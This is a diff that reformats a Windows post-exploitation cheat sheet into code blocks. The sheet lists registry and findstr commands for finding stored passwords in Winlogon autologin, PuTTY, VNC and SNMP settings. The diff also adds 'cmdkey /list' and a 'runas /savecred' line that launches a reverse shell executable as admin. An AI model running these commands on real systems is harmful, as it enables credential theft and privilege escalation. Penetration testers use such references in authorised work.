@@ -519,30 +519,61 @@ Get-History
 (Get-PSReadlineOption).HistorySavePath
 ```
 
-reg query HKLM /f password /t REG_SZ /s
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+### Search for files
+```ps
+findstr /si password *.<file_type>
+```
 
 ### Putty keys
+```ps
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
+```
+```ps
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
+```
 
-### VNC
-reg query "HKCU\Software\ORL\WinVNC3\Password"  
-reg query "HKCU\Software\TightVNC\Server"  
+### VNC passwords
+```ps
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+```
+```ps
+reg query "HKCU\Software\TightVNC\Server"
+```
 
-### Windows autologin  
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
+### Windows autologin
+```ps
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+```
+```ps
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+```
 
-### SNMP Parameters  
-reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
+### SNMP Parameters
+```ps
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+```
 
-### Putty  
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
+### Putty passwords
+```ps
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+```
 
-### Search for the password in the registry  
-reg query HKLM /f password /t REG_SZ /s  
+### Search for the password in the registry
+```ps
+reg query HKLM /f password /t REG_SZ /s
+```
+```ps
 reg query HKCU /f password /t REG_SZ /s
+```
+
+### Displays stored credentials looks for any optential users
+```ps
+cmdkey /list 
+```
+### Transfer the reverseshell
+```ps
+runas /savecred /user:admin C:\Temp\reverse.exe
+```
   
 </details>
 
